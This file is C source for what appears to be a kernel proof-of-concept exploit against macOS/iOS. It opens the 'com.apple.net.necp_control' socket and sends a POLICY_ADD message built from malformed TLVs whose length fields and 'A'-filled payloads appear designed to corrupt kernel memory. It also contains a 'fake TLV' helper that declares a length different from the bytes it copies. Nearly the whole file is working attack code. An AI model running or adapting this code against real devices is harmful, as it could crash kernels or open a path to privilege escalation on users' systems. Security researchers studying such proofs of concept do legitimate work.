#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/kern_control.h>
#include <sys/sys_domain.h>
#include <net/if.h>
#include <netinet/in_var.h>
#include <netinet6/nd6.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CONTROL_NAME "com.apple.net.necp_control"

int ctl_open(void) {
  int           sock;
  int           error     = 0;
  struct ctl_info     kernctl_info;
  struct sockaddr_ctl   kernctl_addr;

  sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
  if (sock < 0) {
    printf("failed to open a SYSPROTO_CONTROL socket: %s", strerror(errno));
    goto done;
  }

  memset(&kernctl_info, 0, sizeof(kernctl_info));
  strlcpy(kernctl_info.ctl_name, CONTROL_NAME, sizeof(kernctl_info.ctl_name));

  error = ioctl(sock, CTLIOCGINFO, &kernctl_info);
  if (error) {
    printf("Failed to get the control info for control named \"%s\": %s\n", CONTROL_NAME, strerror(errno));
    goto done;
  }

  memset(&kernctl_addr, 0, sizeof(kernctl_addr));
  kernctl_addr.sc_len = sizeof(kernctl_addr);
  kernctl_addr.sc_family = AF_SYSTEM;
  kernctl_addr.ss_sysaddr = AF_SYS_CONTROL;
  kernctl_addr.sc_id = kernctl_info.ctl_id;
  kernctl_addr.sc_unit = 0;

  error = connect(sock, (struct sockaddr *)&kernctl_addr, sizeof(kernctl_addr));
  if (error) {
    printf("Failed to connect to the control socket: %s", strerror(errno));
    goto done;
  }

done:
  if (error && sock >= 0) {
    close(sock);
    sock = -1;
  }

  return sock;
}

struct necp_packet_header {
    uint8_t   packet_type;
    uint8_t   flags;
    uint32_t  message_id;
};

uint8_t* add_real_tlv(uint8_t* buf, uint8_t type, size_t len, uint8_t* val){
  *buf = type;
  *(( size_t*)(buf+1)) = len;
  memcpy(buf+9, val, len);
  return buf+9+len;
}

uint8_t* add_fake_tlv(uint8_t* buf, uint8_t type, size_t len, uint8_t* val, size_t real_len){
  *buf = type;
  *(( size_t*)(buf+1)) = len;
  memcpy(buf+9, val, real_len);
  return buf+9+real_len;
}

int main(){
  int fd = ctl_open();
  if (fd < 0) {
    printf("failed to get control socket :(\n");
    return 1;
  }
  printf("got a control socket! %d\n", fd);

  size_t msg_size;
  uint8_t* msg = malloc(0x1000);
  memset(msg, 0, 0x1000);

  uint8_t* payload = malloc(0x1000);
  memset(payload, 'A', 0x1000);

  struct necp_packet_header* hdr = (struct necp_packet_header*) msg;
  hdr->packet_type = 1; // POLICY_ADD
  hdr->flags = 0;
  hdr->message_id = 0;

  uint8_t* buf = (uint8_t*)(hdr+1);

  uint32_t order = 0x1234;
  buf = add_real_tlv(buf, 2, 4, &order); // NECP_TLV_POLICY_ORDER

  uint8_t policy = 1; // NECP_POLICY_RESULT_PASS
  buf = add_real_tlv(buf, 4, 1, &policy); // NECP_TLV_POLICY_RESULT
  
  buf = add_real_tlv(buf, 3, 1, payload); // NECP_TLV_POLICY_CONDITION
  buf = add_real_tlv(buf, 3, 1024, payload); // NECP_TLV_POLICY_CONDITION
  buf = add_real_tlv(buf, 3, 1024, payload); 
  msg_size = buf - msg;

  send(fd, msg, msg_size, 0);

  close(fd);
  return 0;
}
